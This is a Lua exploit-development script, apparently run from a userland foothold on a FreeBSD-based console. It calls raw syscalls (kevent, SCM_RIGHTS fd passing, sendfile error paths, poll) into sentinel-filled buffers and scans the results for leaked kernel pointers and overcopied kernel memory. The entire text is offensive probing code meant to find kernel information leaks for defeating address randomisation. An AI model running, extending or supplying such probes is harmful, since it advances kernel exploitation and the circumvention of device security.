-- CRASH_CLASS: LOW
-- PROBE 56q: kevent output scan + SCM_RIGHTS overcopy + sendfile error path
--
-- A: Register kevents on known fds (socket, kqueue, pipe), retrieve with
--    kevent(363), scan output structs for kernel pointers.
-- B: SCM_RIGHTS fd passing — send an fd through unix socketpair, scan
--    cmsg padding around the passed fd for kernel data.
-- C: sendfile(393) error path — call with bad args, check if output
--    sf_hdtr struct is partially written with kernel stack data.
-- D: poll(209) — pollfd output scan for kernel data in revents padding.

print("=== PROBE 56q: KEVENT + SCM_RIGHTS + SENDFILE + POLL ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end

local SENTINEL = 0xEEEEEEEE

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function scan_kptr(base, len, label)
    local found = false
    for off = 0, len - 8, 4 do
        local lo = rd(base + off)
        local hi = rd(base + off + 4)
        if lo and hi then
            local uh = hi; if uh < 0 then uh = uh + 0x100000000 end
            if uh >= 0xFFFF8000 and uh < 0xFFFFFFFF then
                found = true
                local ul = lo; if ul < 0 then ul = ul + 0x100000000 end
                print(string.format("  *** %s KPTR +0x%X: 0x%08X%08X ***",
                    label, off, uh, ul))
            end
        end
    end
    return found
end

local sc_socket = mk(97)
local sc_close = mk(6)
local sc_mmap = mk(477)

-- ============ SECTION A: kevent output scan ============
print("--- A: kevent output ---")

local sc362 = mk(362)  -- kqueue
local sc363 = mk(363)  -- kevent

-- Create kqueue
local ok1, kqfd = pcall(function() return sc362() end)
local kq = ok1 and N(kqfd) or -1
print("  kqueue fd=" .. kq)

if kq >= 0 then
    -- Create a UDP socket to register events on
    local ok2, sfd = pcall(function()
        return sc_socket(uint64(2), uint64(2), uint64(17))
    end)
    local sock = ok2 and N(sfd) or -1

    if sock >= 0 then
        -- struct kevent on FreeBSD/amd64:
        -- ident(8) filter(2) flags(2) fflags(4) data(8) udata(8) ext[4](32) = 64 bytes
        -- But older FreeBSD without EV_RECEIPT extensions might be 32 bytes:
        -- ident(8) filter(2) flags(2) fflags(4) data(8) udata(8) = 32 bytes

        -- Register: EVFILT_READ=-1 on socket, EV_ADD=0x1
        local chg = memory.alloc(64)
        local ca = N(chg)
        for i = 0, 60, 4 do wd(ca + i, 0) end
        -- ident = sock fd
        wq(uint64(ca), uint64(sock))
        -- filter = EVFILT_READ = -1 (0xFFFF), flags = EV_ADD|EV_ONESHOT = 0x11
        -- packed as: filter(i16) + flags(u16) = 0x0011FFFF at +0x08
        wd(ca + 8, 0x0011FFFF)  -- filter=-1, flags=0x11

        -- Output buffer — sentinel-filled
        local out = memory.alloc(0x200)
        local oa = N(out)
        for i = 0, 0x1FC, 4 do wd(oa + i, SENTINEL) end

        -- kevent(kq, changelist, nchanges, eventlist, nevents, timeout)
        -- Use zero timeout for non-blocking
        local ts = memory.alloc(16)
        wq(ts, uint64(0))        -- tv_sec = 0
        wq(uint64(N(ts) + 8), uint64(0))  -- tv_nsec = 0

        local ok3, r3 = pcall(function()
            return sc363(uint64(kq), uint64(ca), uint64(1),
                uint64(oa), uint64(8), uint64(N(ts)))
        end)
        local kev_ret = ok3 and N(r3) or -999
        print("  kevent ret=" .. kev_ret)

        -- Scan output for kernel pointers
        if kev_ret > 0 then
            local ev_size = 32  -- minimum kevent size
            local total = kev_ret * ev_size
            scan_kptr(oa, math.min(total + 64, 0x200), "KEVENT")

            -- Dump first event
            print("  event[0]:")
            for off = 0, ev_size - 4, 4 do
                local v = rd(oa + off) or SENTINEL
                if v ~= SENTINEL then
                    local uv = v; if uv < 0 then uv = uv + 0x100000000 end
                    print(string.format("    +0x%02X: 0x%08X", off, uv))
                end
            end

            -- Check if data extends past 32 bytes (ext fields)
            for off = 32, 63, 4 do
                local v = rd(oa + off)
                if v and v ~= SENTINEL then
                    local uv = v; if uv < 0 then uv = uv + 0x100000000 end
                    print(string.format("    ext +0x%02X: 0x%08X", off, uv))
                end
            end
        elseif kev_ret == 0 then
            print("  no events ready (expected for unbound socket)")
            -- Check if anything was written anyway
            for off = 0, 63, 4 do
                local v = rd(oa + off)
                if v ~= SENTINEL then
                    local uv = v; if uv < 0 then uv = uv + 0x100000000 end
                    print(string.format("    written despite ret=0: +0x%02X=0x%08X", off, uv))
                end
            end
        end

        -- Also try EVFILT_TIMER=-7 (creates a kernel timer, might leak timer addr)
        for i = 0, 60, 4 do wd(ca + i, 0) end
        wq(uint64(ca), uint64(0x1234))     -- ident = arbitrary
        wd(ca + 8, 0x0001FFF9)             -- filter=-7(TIMER), flags=EV_ADD(1)
        wq(uint64(ca + 16), uint64(100))   -- data = 100ms interval

        for i = 0, 0x7C, 4 do wd(oa + i, SENTINEL) end

        local ok4, r4 = pcall(function()
            return sc363(uint64(kq), uint64(ca), uint64(1),
                uint64(oa), uint64(4), uint64(N(ts)))
        end)
        local t_ret = ok4 and N(r4) or -999
        print("  kevent(TIMER) ret=" .. t_ret)

        if t_ret > 0 then
            scan_kptr(oa, 128, "TIMER_EV")
            for off = 0, 31, 4 do
                local v = rd(oa + off) or SENTINEL
                if v ~= SENTINEL then
                    local uv = v; if uv < 0 then uv = uv + 0x100000000 end
                    print(string.format("    +0x%02X: 0x%08X", off, uv))
                end
            end
        end

        pcall(function() sc_close(uint64(sock)) end)
    end

    pcall(function() sc_close(uint64(kq)) end)
end

if not alive() then print("DEAD after A"); return end

-- ============ SECTION B: SCM_RIGHTS fd passing overcopy ============
print("")
print("--- B: SCM_RIGHTS fd passing ---")

local sc135 = mk(135)   -- socketpair
local sc28 = mk(28)     -- sendmsg
local sc27 = mk(27)     -- recvmsg

local sv = memory.alloc(8)
wd(N(sv), 0); wd(N(sv) + 4, 0)
local ok5, r5 = pcall(function()
    return sc135(uint64(1), uint64(1), uint64(0), uint64(N(sv)))
end)
local sp_ret = ok5 and N(r5) or -999
local fd0 = rd(N(sv))
local fd1 = rd(N(sv) + 4)
print("  socketpair=" .. sp_ret .. " fds=" .. tostring(fd0) .. "," .. tostring(fd1))

if sp_ret == 0 and fd0 and fd1 and fd0 >= 0 and fd1 >= 0 then
    -- Create an fd to pass (a fresh socket)
    local ok6, pfd = pcall(function()
        return sc_socket(uint64(2), uint64(2), uint64(17))
    end)
    local pass_fd = ok6 and N(pfd) or -1

    if pass_fd >= 0 then
        -- Build sendmsg with SCM_RIGHTS cmsg
        local snd_data = memory.alloc(4)
        wd(N(snd_data), 0x58585858)

        local snd_iov = memory.alloc(16)
        wq(snd_iov, uint64(N(snd_data)))
        wq(uint64(N(snd_iov) + 8), uint64(4))

        -- cmsg for SCM_RIGHTS: cmsg_len, cmsg_level=SOL_SOCKET(0xFFFF), cmsg_type=SCM_RIGHTS(1), fd
        -- CMSG_SPACE(4) = 12 header + 4 data + padding = 16 bytes? Actually CMSG_ALIGN rounds up.
        -- On 64-bit: CMSG_ALIGN(12+4) = 16
        local scmsg = memory.alloc(32)
        local sca = N(scmsg)
        for i = 0, 28, 4 do wd(sca + i, SENTINEL) end
        wd(sca, 16)            -- cmsg_len = sizeof(cmsghdr) + sizeof(int) = 12 + 4 = 16
        wd(sca + 4, 0xFFFF)   -- cmsg_level = SOL_SOCKET
        wd(sca + 8, 1)        -- cmsg_type = SCM_RIGHTS
        wd(sca + 12, pass_fd)  -- the fd to pass

        -- msghdr (amd64 layout)
        local smsg = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(smsg) + i, 0) end
        wq(uint64(N(smsg) + 0x10), uint64(N(snd_iov)))
        wd(N(smsg) + 0x18, 1)
        wq(uint64(N(smsg) + 0x20), uint64(sca))
        wd(N(smsg) + 0x28, 16)

        local ok7, r7 = pcall(function()
            return sc28(uint64(fd0), uint64(N(smsg)), uint64(0))
        end)
        print("  sendmsg(SCM_RIGHTS)=" .. (ok7 and tostring(N(r7)) or "FAIL"))

        -- Receive on fd1 with large cmsg buffer
        local rcv_data = memory.alloc(16)
        local rcv_iov = memory.alloc(16)
        wq(rcv_iov, uint64(N(rcv_data)))
        wq(uint64(N(rcv_iov) + 8), uint64(16))

        local cmsg_recv = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
        local crba = N(cmsg_recv)
        for off = 0, 0x200 - 4, 4 do wd(crba + off, SENTINEL) end

        local rmsg = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(rmsg) + i, 0) end
        wq(uint64(N(rmsg) + 0x10), uint64(N(rcv_iov)))
        wd(N(rmsg) + 0x18, 1)
        wq(uint64(N(rmsg) + 0x20), uint64(crba))
        wd(N(rmsg) + 0x28, 0x200)

        local ok8, r8 = pcall(function()
            return sc27(uint64(fd1), uint64(N(rmsg)), uint64(0))
        end)
        local rv = ok8 and N(r8) or -999
        print("  recvmsg=" .. rv)

        local clen = rd(N(rmsg) + 0x28) or 0
        print("  controllen=" .. clen)

        if clen > 0 then
            -- Dump cmsg
            print("  cmsg (" .. clen .. "B):")
            for off = 0, math.min(clen + 32, 0x100) - 4, 4 do
                local v = rd(crba + off) or SENTINEL
                if v ~= SENTINEL then
                    local uv = v; if uv < 0 then uv = uv + 0x100000000 end
                    print(string.format("    +0x%02X: 0x%08X", off, uv))
                end
            end
            scan_kptr(crba, math.min(clen + 64, 0x200), "SCM_RIGHTS")

            -- Read the passed fd
            local rcv_fd = rd(crba + 12)
            print("  received_fd=" .. tostring(rcv_fd))
        end

        pcall(function() sc_close(uint64(pass_fd)) end)
    end

    pcall(function() sc_close(uint64(fd0)) end)
    pcall(function() sc_close(uint64(fd1)) end)
end

if not alive() then print("DEAD after B"); return end

-- ============ SECTION C: sendfile error path ============
print("")
print("--- C: sendfile(393) ---")

local sc393 = mk(393)
-- sendfile(fd, s, offset, nbytes, hdtr, sbytes, flags)
-- Call with invalid args to check if sbytes gets partially written

local sbytes = memory.alloc(16)
wd(N(sbytes), SENTINEL)
wd(N(sbytes) + 4, SENTINEL)
wd(N(sbytes) + 8, SENTINEL)

-- Open eboot for reading
local sc5 = mk(5)
local ename = memory.alloc(32)
wd(N(ename), 0x7070612F)     -- /app
wd(N(ename) + 4, 0x62652F30) -- 0/eb
wd(N(ename) + 8, 0x2E746F6F) -- oot.
wd(N(ename) + 12, 0x006E6962) -- bin\0
local ok9, efd = pcall(function() return sc5(ename, uint64(0), uint64(0)) end)
local ef = ok9 and N(efd) or -1

-- Create a TCP socket
local ok10, tfd = pcall(function()
    return sc_socket(uint64(2), uint64(1), uint64(6))
end)
local tsock = ok10 and N(tfd) or -1

print("  eboot_fd=" .. ef .. " tcp_sock=" .. tsock)

if ef >= 0 and tsock >= 0 then
    -- Try sendfile — will fail but check sbytes
    local ok11, r11 = pcall(function()
        return sc393(uint64(ef), uint64(tsock), uint64(0), uint64(0x1000),
            uint64(0), uint64(N(sbytes)), uint64(0))
    end)
    print("  sendfile ret=" .. (ok11 and tostring(N(r11)) or "FAIL"))

    -- Check sbytes
    local sb0 = rd(N(sbytes)) or SENTINEL
    local sb1 = rd(N(sbytes) + 4) or SENTINEL
    print(string.format("  sbytes: lo=0x%08X hi=0x%08X",
        sb0 < 0 and sb0 + 0x100000000 or sb0,
        sb1 < 0 and sb1 + 0x100000000 or sb1))

    if sb0 ~= SENTINEL or sb1 ~= SENTINEL then
        scan_kptr(N(sbytes), 16, "SENDFILE")
    end

    pcall(function() sc_close(uint64(ef)) end)
    pcall(function() sc_close(uint64(tsock)) end)
end

if not alive() then print("DEAD after C"); return end

-- ============ SECTION D: poll output scan ============
print("")
print("--- D: poll(209) ---")

local sc209 = mk(209)  -- poll

-- Create a socket and a kqueue to poll
local ok12, s2fd = pcall(function()
    return sc_socket(uint64(2), uint64(2), uint64(17))
end)
local s2 = ok12 and N(s2fd) or -1

if s2 >= 0 then
    -- struct pollfd: fd(4) events(2) revents(2) = 8 bytes
    -- Allocate extra to check overcopy
    local pfd = memory.alloc(0x40)
    local pa = N(pfd)
    for i = 0, 0x3C, 4 do wd(pa + i, SENTINEL) end
    wd(pa, s2)         -- fd
    wd(pa + 4, 0x0041) -- events = POLLIN|POLLPRI (low 16 bits), revents = 0 (high 16)

    local ok13, r13 = pcall(function()
        return sc209(uint64(pa), uint64(1), uint64(0))  -- timeout=0 (non-blocking)
    end)
    local poll_ret = ok13 and N(r13) or -999
    print("  poll ret=" .. poll_ret)

    -- Read revents
    local ev_dw = rd(pa + 4) or 0
    local uev = ev_dw; if uev < 0 then uev = uev + 0x100000000 end
    local revents = math.floor(uev / 65536)
    print(string.format("  events=0x%04X revents=0x%04X", uev % 65536, revents))

    -- Check for overcopy past 8 bytes
    for off = 8, 0x20, 4 do
        local v = rd(pa + off)
        if v ~= SENTINEL then
            local uv = v; if uv < 0 then uv = uv + 0x100000000 end
            print(string.format("  OVERCOPY +0x%02X: 0x%08X", off, uv))
        end
    end

    -- Also check the main pollfd for kernel pointers
    scan_kptr(pa, 0x20, "POLL")

    pcall(function() sc_close(uint64(s2)) end)
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56q COMPLETE ===")
